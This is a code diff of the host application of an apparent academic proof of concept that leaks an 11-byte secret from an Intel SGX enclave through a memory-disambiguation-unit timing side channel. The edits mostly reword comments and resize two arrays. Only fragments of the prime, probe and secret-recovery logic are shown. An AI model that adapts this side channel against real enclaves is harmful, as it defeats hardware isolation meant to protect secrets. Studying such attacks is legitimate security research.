@@ -11,22 +11,20 @@
 #include "App.h"
 #include "Enclave_u.h"
 #ifdef _MSC_VER
-#include <intrin.h> /* for rdtscp and clflush */
+#include <intrin.h>
 #pragma optimize("gt",on)
 #else
-#include <x86intrin.h> /* for rdtscp and clflush */
+#include <x86intrin.h>
 #endif
 
-/* Global EID shared by multiple threads */
 sgx_enclave_id_t global_eid = 0;
 
 typedef struct _sgx_errlist_t {
     sgx_status_t err;
     const char *msg;
-    const char *sug; /* Suggestion */
+    const char *sug;
 } sgx_errlist_t;
 
-/* Error code returned by sgx_create_enclave */
 static sgx_errlist_t sgx_errlist[] = {
     {
         SGX_ERROR_UNEXPECTED,
@@ -105,7 +103,6 @@ static sgx_errlist_t sgx_errlist[] = {
     },
 };
 
-/* Check error conditions for loading enclave */
 void print_error_message(sgx_status_t ret)
 {
     size_t idx = 0;
@@ -124,9 +121,6 @@ void print_error_message(sgx_status_t ret)
     	printf("Error code is 0x%X. Please refer to the \"Intel SGX SDK Developer Reference\" for more details.\n", ret);
 }
 
-/* Initialize the enclave:
- *   Call sgx_create_enclave to initialize an enclave instance
- */
 int initialize_enclave(void)
 {
     sgx_status_t ret = SGX_ERROR_UNEXPECTED;
@@ -142,12 +136,8 @@ int initialize_enclave(void)
     return 0;
 }
 
-/* OCall functions */
 void ocall_print_string(const char *str)
 {
-    /* Proxy/Bridge will check the length and null-terminate 
-     * the input string to prevent buffer overflow. 
-     */
     printf("%s", str);
 }
 
@@ -155,7 +145,9 @@ void ocall_print_string(const char *str)
 extern "C" size_t stld_probe_1(void* addr_st, void* addr_ld);
 extern "C" size_t stld_probe_2(void* addr_st, void* addr_ld);
 
-int get_max_idx(int* vals, int val_len) {
+// Calculate the noise from context switch
+int get_max_idx(int* vals, int val_len) 
+{
     int max = -1;
     int max_idx = -1;
     for (int i = 0; i < val_len; ++ i) {
@@ -167,7 +159,9 @@ int get_max_idx(int* vals, int val_len) {
     return max_idx;
 }
 
-void init_mdu() {
+// Initialize 2 MDU counters corresponding to the store-load pair in the enclave to 15
+void init_mdu() 
+{
     int A[10];
     size_t (*stld_init_1)(void*, void*);
     size_t (*stld_init_2)(void*, void*);
@@ -183,7 +177,9 @@ void init_mdu() {
     }
 }
 
-void probe_mdu(int* res_val) {
+// Probe 2 MDU counters corresponding to the store-load pair in the enclave
+void probe_mdu(int* res_val) 
+{
     int A[10];
     int probe_1, probe_2;
     size_t timestamp_1[30], timestamp_2[30];
@@ -204,37 +200,29 @@ void probe_mdu(int* res_val) {
             break;
 		}
     }
-    // for(int i = 0; i < 30; ++ i) {
-    //     printf("%d ", (int)timestamp_1[i]);
-    // }
-    // printf("\n");
-    // for(int i = 0; i < 30; ++ i) {
-    //     printf("%d ", (int)timestamp_2[i]);
-    // }
-    // printf("\n");
 	res_val[0] = probe_1;
     res_val[1] = probe_2;
 }
 
-/* Application entry */
-int SGX_CDECL main(int argc, char *argv[]) {
-
+// Application entry
+int SGX_CDECL main(int argc, char *argv[]) 
+{
     (void)(argc);
     (void)(argv);
 
     int prob_val[2];
-    int val_init_1_cnt[15];
-    int val_init_2_cnt[15];
+    int val_init_1_cnt[16];
+    int val_init_2_cnt[16];
     memset(val_init_1_cnt, 0, sizeof(val_init_1_cnt));
     memset(val_init_2_cnt, 0, sizeof(val_init_2_cnt));
     int val_init_1, val_init_2;
 
-    /* Initialize the enclave */
+    // Initialize the enclave
     if(initialize_enclave() < 0){
         abort();
     }
 
-    /* Get init value of each counter */
+    // Get init value of each counter after context switches
     for (int i = 0; i < 128; ++ i) {
         init_mdu();
         int ret = secretDependentBranch(global_eid, -1, 0);
@@ -251,8 +239,7 @@ int SGX_CDECL main(int argc, char *argv[]) {
     val_init_1 = get_max_idx(val_init_1_cnt, 16);
     val_init_2 = get_max_idx(val_init_2_cnt, 16);
 
-    // printf("%d %d\n", val_init_1, val_init_2);
-
+    // Perform MDU side channel to leak secrets
     #define SECRET_LEN 11
     int recover_bits[SECRET_LEN * 8];
     char recover_secret[SECRET_LEN + 1];
@@ -274,6 +261,8 @@ int SGX_CDECL main(int argc, char *argv[]) {
             }
         }
     }
+
+    // dump results
     for(int i = 0; i < SECRET_LEN; ++ i) {
         recover_secret[i] = 0;
         for(int j = 0; j < 8; ++ j) {
